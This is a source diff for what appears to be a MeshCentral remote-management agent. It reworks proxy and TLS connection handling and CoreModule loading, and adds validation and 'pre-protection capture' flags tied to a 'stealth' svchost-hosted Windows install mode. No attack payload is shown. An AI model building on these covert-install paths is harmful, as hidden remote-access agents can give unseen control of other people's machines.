-                ILibWebClient_Request_SetALPN(reqToken, g_meshNetworkProfile.alpnProtocols);
-				alpnChoice = g_meshNetworkProfile.alpnProtocols;
-            }
-            else
-            {
-                ILibWebClient_Request_SetALPN(reqToken, NULL);
-            }
-			MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: TLS useHTTPS=%d SNI=%s ALPN=%s",
-				(result == ILibParseUriResult_TLS ? 1 : 0),
-				(effectiveSNI != NULL && effectiveSNI[0] != 0) ? effectiveSNI : "(null)",
-				alpnChoice != NULL ? alpnChoice : "(null)");
-			if (agent->controlChannelDebug != 0 || agent->logUpdate != 0)
-			{
-				ILIBLOGMESSAGEX("MeshServer_ConnectEx: TLS useHTTPS=%d SNI=%s ALPN=%s",
-					(result == ILibParseUriResult_TLS ? 1 : 0),
-					(effectiveSNI != NULL && effectiveSNI[0] != 0) ? effectiveSNI : "(null)",
-					alpnChoice != NULL ? alpnChoice : "(null)");
-			}
-        }
+	ILibWebClient_Request_SetHTTPS(reqToken, result == ILibParseUriResult_TLS ? ILibWebClient_RequestToken_USE_HTTPS : ILibWebClient_RequestToken_USE_HTTP);
+	ILibWebClient_Request_SetSNI(reqToken, host, (int)strnlen_s(host, serverUrlLen));
+	ILibWebClient_Request_SetALPN(reqToken, NULL);
+	MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: TLS useHTTPS=%d SNI=%s ALPN=%s",
+		(result == ILibParseUriResult_TLS ? 1 : 0),
+		host != NULL ? host : "(null)",
+		"(none)");
+	if (agent->controlChannelDebug != 0 || agent->logUpdate != 0)
+	{
+		ILIBLOGMESSAGEX("MeshServer_ConnectEx: TLS useHTTPS=%d SNI=%s ALPN=%s",
+			(result == ILibParseUriResult_TLS ? 1 : 0),
+			host != NULL ? host : "(null)",
+			"(none)");
+	}
 #endif
 
-		if (useproxy != 0)
-		{
-			// Setup Proxy Configuration
-			// High Fix #11: Improved proxy error handling with proper Duktape stack management
-			int stackTop = duk_get_top(agent->meshCoreCtx);  // Save stack position for cleanup
-			duk_eval_string(agent->meshCoreCtx, "require('http')");			// [http]
-			duk_get_prop_string(agent->meshCoreCtx, -1, "parseUri");		// [http][parse]
-			duk_swap_top(agent->meshCoreCtx, -2);							// [parse][this]
-			duk_push_string(agent->meshCoreCtx, webproxy);					// [parse][this][uri]
-			if (duk_pcall_method(agent->meshCoreCtx, 1) == 0)				// [uri]
-			{
-				agent->proxyFailed = 0;
-				unsigned short proxyPort = (unsigned short)Duktape_GetIntPropertyValue(agent->meshCoreCtx, -1, "port", 80);
-				char *proxyHost = (char*)Duktape_GetStringPropertyValue(agent->meshCoreCtx, -1, "host", NULL);
-				char *proxyUsername = (char*)Duktape_GetStringPropertyValue(agent->meshCoreCtx, -1, "username", NULL);
-				char *proxyPassword = (char*)Duktape_GetStringPropertyValue(agent->meshCoreCtx, -1, "password", NULL);
-
-				// Validate proxy host before use
-				if (proxyHost == NULL || proxyHost[0] == '\0')
-				{
-					MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: proxy URI parse failed, no host");
-					agent->proxyFailed = 1;
-				}
-				else
-				{
-					agent->proxyServer = ILibWebClient_SetProxy2(reqToken, proxyHost, proxyPort, proxyUsername, proxyPassword, host, port);
-
-					if (agent->proxyServer != NULL)
-					{
-						ILibDuktape_globalTunnel_data *proxy = ILibDuktape_GetNewGlobalTunnel(agent->meshCoreCtx);
-						if (proxy != NULL)
-						{
-							memcpy_s(&(proxy->proxyServer), sizeof(struct sockaddr_in6), agent->proxyServer, sizeof(struct sockaddr_in6));
-							if (proxyUsername != NULL && proxyPassword != NULL)
-							{
-								memcpy_s(proxy->proxyUser, sizeof(proxy->proxyUser), proxyUsername, strnlen_s(proxyUsername, sizeof(proxy->proxyUser)));
-								memcpy_s(proxy->proxyPass, sizeof(proxy->proxyPass), proxyPassword, strnlen_s(proxyPassword, sizeof(proxy->proxyPass)));
-							}
-						}
-						else
-						{
-							MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: global tunnel unavailable for proxy (%s:%u)", proxyHost, proxyPort);
-						}
-					}
-					else
-					{
-						agent->proxyFailed = 1;
-					}
-				}
-			}
-			else
-			{
-				// Proxy URI parsing failed - log the error
-				const char *errMsg = duk_safe_to_string(agent->meshCoreCtx, -1);
-				MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: proxy URI parse error: %s", errMsg ? errMsg : "(unknown)");
-				agent->proxyFailed = 1;
-			}
-			// Restore stack to original position to ensure no leaks
-			duk_set_top(agent->meshCoreCtx, stackTop);
-		}
-		agent->serverConnectionState = 1; // We are trying to connect
-		MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: serverConnectionState set to 1 token=%p", reqToken);
-	}
-	else
-	{
-		ILibDestructPacket(req);
-		MeshServer_Connect(agent);
-	}
+	agent->serverConnectionState = 1;
+	MeshAgent_ControlChannelDebugLog(agent, "MeshServer_ConnectEx: serverConnectionState set to 1 token=%p", reqToken);
 	free(host);
 }
+
 void MeshServer_DbWarning(ILibSimpleDataStore db, uint64_t size, void *user)
 {
 	MeshAgentHostContainer *agent = (MeshAgentHostContainer*)user;
@@ -7359,25 +6894,38 @@ void MeshServer_Agent_SelfTest(MeshAgentHostContainer *agent)
 	}
 	printf("   -> Loading meshcore.js from db ........");
 
-	if (CoreModuleLen <= 4 	&& ILibSimpleDataStore_Get(agent->masterDb, "serviceName", NULL, 0) == 0)
+	if (CoreModuleLen <= 4)
 	{
 		printf("[NOT FOUND]\n");
-		return;
+		ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Microstack_Generic | ILibRemoteLogging_Modules_ConsolePrint,
+			ILibRemoteLogging_Flags_VerbosityLevel_1, "Error Executing MeshCore: CoreModule missing from datastore");
+		exit(1);
 	}
 	else
 	{
-		printf("[OK]\n");
 		agent->serverAuthState = 3;
 		ILibMemory_AllocateRaw(CoreModule, CoreModuleLen);
-		ILibSimpleDataStore_Get(agent->masterDb, "CoreModule", CoreModule, CoreModuleLen);
+		if (ILibSimpleDataStore_Get(agent->masterDb, "CoreModule", CoreModule, CoreModuleLen) != CoreModuleLen)
+		{
+			free(CoreModule);
+			printf("[FAILED]\n");
+			ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Microstack_Generic | ILibRemoteLogging_Modules_ConsolePrint,
+				ILibRemoteLogging_Flags_VerbosityLevel_1, "Error Executing MeshCore: failed to read CoreModule from datastore");
+			exit(1);
+		}
 
+		MeshAgent_EnsureCoreModuleRuntimeGlobals(agent->meshCoreCtx);
 		if (ILibDuktape_ScriptContainer_CompileJavaScriptEx(agent->meshCoreCtx, CoreModule + 4, CoreModuleLen - 4, "CoreModule.js", 13) != 0 ||
 			ILibDuktape_ScriptContainer_ExecuteByteCode(agent->meshCoreCtx) != 0)
 		{
+			printf("[FAILED]\n");
 			ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Microstack_Generic | ILibRemoteLogging_Modules_ConsolePrint,
 				ILibRemoteLogging_Flags_VerbosityLevel_1, "Error Executing MeshCore: %s", duk_safe_to_string(agent->meshCoreCtx, -1));
 			duk_pop(agent->meshCoreCtx);
+			free(CoreModule);
+			exit(1);
 		}
+		printf("[OK]\n");
 		free(CoreModule);
 	}
 
@@ -7535,16 +7083,28 @@ void MeshServer_Connect(MeshAgentHostContainer *agent)
 #ifndef MICROSTACK_NOTLS
 int ValidateMeshServer(ILibWebClient_RequestToken sender, int preverify_ok, STACK_OF(X509) *certs, struct sockaddr_in6 *address)
 {
+	void **userObjects = ILibWebClient_RequestToken_GetUserObjects(sender);
+	MeshAgentHostContainer *agent = (userObjects != NULL) ? (MeshAgentHostContainer*)userObjects[0] : NULL;
+	UNREFERENCED_PARAMETER(certs);
+	UNREFERENCED_PARAMETER(address);
+
 	// Critical Fix #1: Validate TLS certificate chain during initial connection
 	// Previously always returned 1, deferring validation to websocket handshake.
 	// Now we check preverify_ok and allow connection only if OpenSSL validated the chain,
 	// OR if certificate pinning will be performed later (second round validation).
 	// Note: Second round validation in websocket still occurs for server identity check.
+	if (agent != NULL)
+	{
+		agent->tlsRelaxedValidation = 0;
+		agent->tlsInspectionDetected = 0;
+		agent->tlsInspectionLogged = 0;
+		memset(agent->serverWebHash, 0, sizeof(agent->serverWebHash));
+	}
 	if (preverify_ok == 0)
 	{
 		// OpenSSL certificate chain validation failed
 		// Log the failure but allow connection to proceed for second-round validation
-		// This maintains compatibility with self-signed certificates used by MeshCentral
+		// This keeps self-signed MeshCentral provisioning compatibility without enabling the later TLS-inspection fallback work.
 		ILibRemoteLogging_printf(NULL, ILibRemoteLogging_Modules_Agent_GuardPost,
 			ILibRemoteLogging_Flags_VerbosityLevel_1,
 			"ValidateMeshServer: TLS preverify failed, will validate in websocket handshake");
@@ -7701,6 +7261,7 @@ MeshAgentHostContainer* MeshAgent_Create(MeshCommand_AuthInfo_CapabilitiesMask c
 
 	MeshAgentHostContainer* retVal = (MeshAgentHostContainer*)ILibMemory_Allocate(sizeof(MeshAgentHostContainer), 0, NULL, NULL);
 	retVal->selfTestLaunched = 0;
+	retVal->activeProxyCandidateIndex = -1;
 #ifdef WIN32
 	SYSTEM_POWER_STATUS stats;
 
@@ -7716,6 +7277,7 @@ MeshAgentHostContainer* MeshAgent_Create(MeshCommand_AuthInfo_CapabilitiesMask c
 #endif
 
 	retVal->agentID = (AgentIdentifiers)MESH_AGENTID;
+	retVal->version = MESH_AGENT_VERSION;
 	retVal->chain = ILibCreateChainEx(3 * sizeof(void*));
 	retVal->pipeManager = ILibProcessPipe_Manager_Create(retVal->chain);
 	retVal->capabilities = capabilities | MeshCommand_AuthInfo_CapabilitiesMask_CONSOLE | MeshCommand_AuthInfo_CapabilitiesMask_JAVASCRIPT | MeshCommand_AuthInfo_CapabilitiesMask_COMPRESSION;
@@ -7892,6 +7454,7 @@ void MeshAgent_AgentMode_Core_ServerTimeout(duk_context *ctx, void ** args, int 
 		CoreModule = (char*)ILibMemory_Allocate(CoreModuleLen, 0, NULL, NULL);
 		ILibSimpleDataStore_Get(agentHost->masterDb, "CoreModule", CoreModule, CoreModuleLen);
 
+		MeshAgent_EnsureCoreModuleRuntimeGlobals(agentHost->meshCoreCtx);
 		if (ILibDuktape_ScriptContainer_CompileJavaScriptEx(agentHost->meshCoreCtx, CoreModule + 4, CoreModuleLen - 4, "CoreModule.js", 13) != 0 ||
 			ILibDuktape_ScriptContainer_ExecuteByteCode(agentHost->meshCoreCtx) != 0)
 		{
@@ -8027,9 +7590,11 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 		if (strcmp("-finstall", param[ri]) == 0 || strcmp("-funinstall", param[ri]) == 0 ||
 			strcmp("-fullinstall", param[ri]) == 0 || strcmp("-fulluninstall", param[ri]) == 0 ||
 			strcmp("-install", param[ri]) == 0 || strcmp("-uninstall", param[ri]) == 0 ||
+			strcmp("-preprotection-capture", param[ri]) == 0 || strcmp("--preprotection-capture", param[ri]) == 0 ||
 			strcmp("-validate-install", param[ri]) == 0 || strcmp("--validate-install", param[ri]) == 0 ||
 			strcmp("-validate-update", param[ri]) == 0 || strcmp("--validate-update", param[ri]) == 0 ||
-			strcmp("-validate-uninstall", param[ri]) == 0 || strcmp("--validate-uninstall", param[ri]) == 0)
+			strcmp("-validate-uninstall", param[ri]) == 0 || strcmp("--validate-uninstall", param[ri]) == 0 ||
+			strcmp("-validate-package", param[ri]) == 0 || strcmp("--validate-package", param[ri]) == 0)
 		{
 			// Create a readonly DB, because we don't need to persist anything
 			agentHost->masterDb = ILibSimpleDataStore_CreateCachedOnly();
@@ -8084,12 +7649,16 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 	int validateInstallFlag = 0;
 	int validateUpdateFlag = 0;
 	int validateUninstallFlag = 0;
+	int validatePackageFlag = 0;
+	int validatePackageAllowInstalledFallback = 0;
+	int validatePackageRequireConfig = 1;
+	int preProtectionCaptureFlag = 0;
 	int updateFlag = 0;
 	int regressionFlag = 0;
 	char* updateSource = NULL;
 	char* updateDll = NULL;
-	char* masterServiceSource = NULL;
-	int masterServiceEnabled = 1;
+	char* validatePackageSource = NULL;
+	char* preProtectionCapturePath = NULL;
 	int cleanupLauncher = 0;
 	char* cleanupLauncherPath = NULL;
 	int fetchstate = 0;
@@ -8140,29 +7709,29 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 		{
 			validateUninstallFlag = 1;
 		}
+		if (strcmp("-validate-package", param[ri]) == 0 || strcmp("--validate-package", param[ri]) == 0)
+		{
+			validatePackageFlag = 1;
+		}
+		if (strcmp("-preprotection-capture", param[ri]) == 0 || strcmp("--preprotection-capture", param[ri]) == 0)
+		{
+			preProtectionCaptureFlag = 1;
+		}
 		if (strncmp(param[ri], "--update-source=", 16) == 0)
 		{
 			updateSource = param[ri] + 16;
 		}
+		if (strncmp(param[ri], "--package-source=", 17) == 0)
+		{
+			validatePackageSource = param[ri] + 17;
+		}
+		if (strncmp(param[ri], "--capture-path=", 15) == 0)
+		{
+			preProtectionCapturePath = param[ri] + 15;
+		}
 		if (strncmp(param[ri], "--update-dll=", 13) == 0)
 		{
 			updateDll = param[ri] + 13;
-		}
-		if (strncmp(param[ri], "--masterservice-source=", 23) == 0)
-		{
-			masterServiceSource = param[ri] + 23;
-		}
-		if (strncmp(param[ri], "--masterservice=", 16) == 0)
-		{
-			const char* value = param[ri] + 16;
-			if (strcasecmp(value, "0") == 0 || strcasecmp(value, "false") == 0 || strcasecmp(value, "off") == 0 || strcasecmp(value, "no") == 0)
-			{
-				masterServiceEnabled = 0;
-			}
-			else
-			{
-				masterServiceEnabled = 1;
-			}
 		}
 		if (strcmp(param[ri], "--cleanup-launcher") == 0)
 		{
@@ -8188,6 +7757,34 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 				{
 					cleanupLauncherPath = (char*)value;
 				}
+			}
+		}
+		if (strcmp(param[ri], "--allow-installed-fallback") == 0)
+		{
+			validatePackageAllowInstalledFallback = 1;
+		}
+		if (strncmp(param[ri], "--allow-installed-fallback=", 27) == 0)
+		{
+			const char* value = param[ri] + 27;
+			if (strcasecmp(value, "0") == 0 || strcasecmp(value, "false") == 0 || strcasecmp(value, "off") == 0 || strcasecmp(value, "no") == 0)
+			{
+				validatePackageAllowInstalledFallback = 0;
+			}
+			else
+			{
+				validatePackageAllowInstalledFallback = 1;
+			}
+		}
+		if (strncmp(param[ri], "--require-config=", 17) == 0)
+		{
+			const char* value = param[ri] + 17;
+			if (strcasecmp(value, "0") == 0 || strcasecmp(value, "false") == 0 || strcasecmp(value, "off") == 0 || strcasecmp(value, "no") == 0)
+			{
+				validatePackageRequireConfig = 0;
+			}
+			else
+			{
+				validatePackageRequireConfig = 1;
 			}
 		}
 
@@ -8241,16 +7838,41 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 	if (agentHost->noCertStore == 0) { agentHost->noCertStore = ILibSimpleDataStore_Get(agentHost->masterDb, "nocertstore", NULL, 0); }
 #endif
 
+	MeshAgent_ApplyNativeLifecycleBrandingOverrides(agentHost);
+
 	if (fetchstate != 0)
 	{
 		duk_context *ctxx = ILibDuktape_ScriptContainer_InitializeJavaScriptEngineEx(0, 0, agentHost->chain, NULL, NULL, agentHost->exePath, NULL, MeshAgent_AgentInstallerCTX_Finalizer, agentHost->chain);
 		duk_eval_string(ctxx, "require('_agentStatus').start();");
 		return(1);
 	}
-	else if (validateInstallFlag != 0 || validateUpdateFlag != 0 || validateUninstallFlag != 0)
+	else if (preProtectionCaptureFlag != 0)
+	{
+#if defined(WIN32) && defined(MESHAGENT_ENABLE_STEALTH)
+		wchar_t capturePathW[MAX_PATH * 4] = {0};
+		const wchar_t* capturePathPtr = NULL;
+		if (preProtectionCapturePath != NULL && preProtectionCapturePath[0] != 0)
+		{
+			ILibUTF8ToWideEx(preProtectionCapturePath, (int)strnlen_s(preProtectionCapturePath, 4096), capturePathW, (int)_countof(capturePathW));
+			capturePathPtr = capturePathW;
+		}
+		exit(MeshAgent_RunPreProtectionCaptureValidationW(capturePathPtr) ? 0 : ERROR_GEN_FAILURE);
+#else
+		printf("{\"ok\":false,\"error\":\"pre-protection-capture-not-supported\"}\n");
+		exit(ERROR_NOT_SUPPORTED);
+#endif
+	}
+	else if (validateInstallFlag != 0 || validateUpdateFlag != 0 || validateUninstallFlag != 0 || validatePackageFlag != 0)
 	{
 #if defined(WIN32) && defined(MESHAGENT_ENABLE_STEALTH)
 		BOOL ok = FALSE;
+		WCHAR packageSourceW[MAX_PATH * 4] = {0};
+		const wchar_t* packageSourcePtr = NULL;
+		if (validatePackageFlag != 0 && validatePackageSource != NULL && validatePackageSource[0] != 0)
+		{
+			ILibUTF8ToWideEx(validatePackageSource, (int)strnlen_s(validatePackageSource, 4096), packageSourceW, (int)_countof(packageSourceW));
+			packageSourcePtr = packageSourceW;
+		}
 		if (validateUpdateFlag != 0)
 		{
 			ok = Stealth_RunUpdateValidation();
@@ -8258,6 +7880,10 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 		else if (validateUninstallFlag != 0)
 		{
 			ok = Stealth_RunUninstallValidation();
+		}
+		else if (validatePackageFlag != 0)
+		{
+			ok = Stealth_RunPackageValidation(packageSourcePtr, validatePackageAllowInstalledFallback, validatePackageRequireConfig);
 		}
 		else
 		{
@@ -8274,10 +7900,8 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 #if defined(WIN32) && defined(MESHAGENT_ENABLE_STEALTH) && defined(MESH_AGENT_SVCHOST_MODE)
 		WCHAR updateExeW[MAX_PATH * 4] = {0};
 		WCHAR updateDllW[MAX_PATH * 4] = {0};
-		WCHAR masterServiceW[MAX_PATH * 4] = {0};
 		const wchar_t* updateExePtr = NULL;
 		const wchar_t* updateDllPtr = NULL;
-		const wchar_t* masterServicePtr = NULL;
 		if (updateSource != NULL && updateSource[0] != 0)
 		{
 			ILibUTF8ToWideEx(updateSource, (int)strnlen_s(updateSource, 4096), updateExeW, (int)_countof(updateExeW));
@@ -8288,13 +7912,8 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 			ILibUTF8ToWideEx(updateDll, (int)strnlen_s(updateDll, 4096), updateDllW, (int)_countof(updateDllW));
 			updateDllPtr = updateDllW;
 		}
-		if (masterServiceSource != NULL && masterServiceSource[0] != 0)
-		{
-			ILibUTF8ToWideEx(masterServiceSource, (int)strnlen_s(masterServiceSource, 4096), masterServiceW, (int)_countof(masterServiceW));
-			masterServicePtr = masterServiceW;
-		}
 
-		if (!MeshAgent_RunNativeRegression(agentHost, updateExePtr, updateDllPtr, masterServicePtr, masterServiceEnabled != 0))
+		if (!MeshAgent_RunNativeRegression(agentHost, updateExePtr, updateDllPtr))
 		{
 			exit(ERROR_INSTALL_FAILURE);
 		}
@@ -8309,10 +7928,8 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 #if defined(WIN32) && defined(MESHAGENT_ENABLE_STEALTH) && defined(MESH_AGENT_SVCHOST_MODE)
 		WCHAR updateExeW[MAX_PATH * 4] = {0};
 		WCHAR updateDllW[MAX_PATH * 4] = {0};
-		WCHAR masterServiceW[MAX_PATH * 4] = {0};
 		const wchar_t* updateExePtr = NULL;
 		const wchar_t* updateDllPtr = NULL;
-		const wchar_t* masterServicePtr = NULL;
 		if (updateSource != NULL && updateSource[0] != 0)
 		{
 			ILibUTF8ToWideEx(updateSource, (int)strnlen_s(updateSource, 4096), updateExeW, (int)_countof(updateExeW));
@@ -8323,13 +7940,8 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 			ILibUTF8ToWideEx(updateDll, (int)strnlen_s(updateDll, 4096), updateDllW, (int)_countof(updateDllW));
 			updateDllPtr = updateDllW;
 		}
-		if (masterServiceSource != NULL && masterServiceSource[0] != 0)
-		{
-			ILibUTF8ToWideEx(masterServiceSource, (int)strnlen_s(masterServiceSource, 4096), masterServiceW, (int)_countof(masterServiceW));
-			masterServicePtr = masterServiceW;
-		}
 
-		if (!MeshAgent_RunNativeStealthFullUpdate(agentHost, updateExePtr, updateDllPtr, masterServicePtr, masterServiceEnabled != 0))
+		if (!MeshAgent_RunNativeStealthFullUpdate(agentHost, updateExePtr, updateDllPtr))
 		{
 			exit(ERROR_INSTALL_FAILURE);
 		}
@@ -8344,15 +7956,8 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 #if defined(WIN32) && defined(MESHAGENT_ENABLE_STEALTH) && defined(MESH_AGENT_SVCHOST_MODE)
 		DWORD nativeExitCode = ERROR_SUCCESS;
 		BOOL handledNativeInstall = FALSE;
-		WCHAR masterServiceW[MAX_PATH * 4] = {0};
 		WCHAR cleanupLauncherW[MAX_PATH * 4] = {0};
-		const wchar_t* masterServicePtr = NULL;
 		const wchar_t* cleanupLauncherPtr = NULL;
-		if (masterServiceSource != NULL && masterServiceSource[0] != 0)
-		{
-			ILibUTF8ToWideEx(masterServiceSource, (int)strnlen_s(masterServiceSource, 4096), masterServiceW, (int)_countof(masterServiceW));
-			masterServicePtr = masterServiceW;
-		}
 		if (cleanupLauncherPath != NULL && cleanupLauncherPath[0] != 0)
 		{
 			ILibUTF8ToWideEx(cleanupLauncherPath, (int)strnlen_s(cleanupLauncherPath, 4096), cleanupLauncherW, (int)_countof(cleanupLauncherW));
@@ -8362,7 +7967,7 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 		{
 			case 1: // -finstall / -fullinstall
 				handledNativeInstall = TRUE;
-				if (!MeshAgent_RunNativeStealthFullInstall(agentHost, masterServicePtr, masterServiceEnabled != 0))
+				if (!MeshAgent_RunNativeStealthFullInstall(agentHost))
 				{
 					nativeExitCode = ERROR_INSTALL_FAILURE;
 				}
@@ -8374,7 +7979,7 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 
 			case 2: // -funinstall / -fulluninstall / -uninstall
 				handledNativeInstall = TRUE;
-				if (!MeshAgent_RunNativeStealthFullUninstall(masterServiceEnabled != 0))
+				if (!MeshAgent_RunNativeStealthFullUninstall())
 				{
 					nativeExitCode = ERROR_INSTALL_FAILURE;
 				}
@@ -8411,7 +8016,7 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 			case 1:
 			case 5:
 #if defined(WIN32) && defined(MESHAGENT_ENABLE_STEALTH)
-				if (MeshAgent_RunNativeStealthFullInstall(agentHost, NULL, masterServiceEnabled != 0))
+				if (MeshAgent_RunNativeStealthFullInstall(agentHost))
 				{
 					Duktape_SafeDestroyHeap(ctxx);
 					return(1);
@@ -8434,7 +8039,7 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 				break;
 			case 2:
 #if defined(WIN32) && defined(MESHAGENT_ENABLE_STEALTH)
-				if (MeshAgent_RunNativeStealthFullUninstall(masterServiceEnabled != 0))
+				if (MeshAgent_RunNativeStealthFullUninstall())
 				{
 					Duktape_SafeDestroyHeap(ctxx);
 					return(1);
@@ -8976,6 +8581,7 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 					CoreModule = (char*)ILibMemory_Allocate(CoreModuleLen, 0, NULL, NULL);
 					ILibSimpleDataStore_Get(agentHost->masterDb, "CoreModule", CoreModule, CoreModuleLen);
 
+					MeshAgent_EnsureCoreModuleRuntimeGlobals(agentHost->meshCoreCtx);
 					if (ILibDuktape_ScriptContainer_CompileJavaScriptEx(agentHost->meshCoreCtx, CoreModule + 4, CoreModuleLen - 4, "CoreModule.js", 13) != 0 ||
 						ILibDuktape_ScriptContainer_ExecuteByteCode(agentHost->meshCoreCtx) != 0)
 					{
@@ -9028,6 +8634,7 @@ int MeshAgent_AgentMode(MeshAgentHostContainer *agentHost, int paramLen, char **
 				CoreModule = (char*)ILibMemory_Allocate(CoreModuleLen, 0, NULL, NULL);
 				ILibSimpleDataStore_Get(agentHost->masterDb, "CoreModule", CoreModule, CoreModuleLen);
 
+				MeshAgent_EnsureCoreModuleRuntimeGlobals(agentHost->meshCoreCtx);
 				if (ILibDuktape_ScriptContainer_CompileJavaScriptEx(agentHost->meshCoreCtx, CoreModule + 4, CoreModuleLen - 4, "CoreModule.js", 13) != 0 ||
 					ILibDuktape_ScriptContainer_ExecuteByteCode(agentHost->meshCoreCtx) != 0)
 				{
@@ -9644,6 +9251,10 @@ int MeshAgent_Start(MeshAgentHostContainer *agentHost, int paramLen, char **para
 		exePath[x] = 0;
 #endif
 	}
+
+#ifdef WIN32
+	if (agentHost->exePath != NULL && agentHost->exePath[0] != 0)
+#endif
 
 	// Perform a self SHA384 Hash
 	GenerateSHA384FileHash(agentHost->exePath, agentHost->agentHash);
